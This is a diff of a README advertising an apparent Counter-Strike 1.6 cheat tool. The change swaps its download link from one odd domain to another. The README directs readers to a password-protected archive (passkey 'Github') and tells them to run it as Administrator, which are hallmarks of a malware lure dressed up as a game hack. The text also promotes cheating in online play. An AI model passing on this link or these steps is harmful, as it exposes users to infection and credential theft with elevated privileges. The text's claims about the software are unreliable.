@@ -6,7 +6,7 @@ Counter-Strike 1.6 hack with ESP, aimbot, triggerbot, and wallhack for CS 1.6. F
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular mods like **OpenHack**, **Eclipse Menu**, and **QOLMod**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Counter-Strike 1.6.
 4. Run the hack **as Administrator**.
